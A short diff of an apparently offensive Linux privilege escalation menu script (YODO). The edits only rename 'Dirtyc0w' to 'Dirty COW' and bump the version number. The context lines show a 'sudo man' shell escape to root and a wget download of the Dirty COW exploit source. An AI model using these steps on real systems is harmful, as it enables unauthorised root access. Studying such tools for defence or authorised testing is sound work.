@@ -133,7 +133,7 @@ echo
 echo -e "\e[1;92m Select From the menu:"
 echo 
 echo "   1) Find                8) Man  *               17) Pathzuzu °‡"
-echo "   2) AWK                10) Dirtyc0w °‡          18) History °‡"
+echo "   2) AWK                10) Dirty COW °‡          18) History °‡"
 echo "   3) Nmap               11) Gdb                  19) Vim"
 echo "   4) Vi                 12) Ruby                 20) Lua"
 echo "   5) Python             13) b3                   21) Ftp *"
@@ -194,7 +194,7 @@ elif [ $number = 9 ]; then
 	echo 'when the MAN page appears, please type "!bash" (without quotes) and press Enter'
 	read -p "Press Enter to continue..."
 	sudo man man
-# DIRTYC0W
+# DIRTY COW
 elif [ $number = 10 ]; then
 	clear
 	wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
@@ -366,7 +366,7 @@ elif [ $number = 21 ]; then
 # CREDITS
 elif [ $number = 22 ]; then
 	echo
-	echo "  YODO version 1.5.0"
+	echo "  YODO version 1.5.1"
 	echo "  Created by: b3rito"
 	echo "  Report bugs: b3rito@mes3hacklab.org"
 	echo "  Homepage: http://mes3hacklab.org/yodo.html"
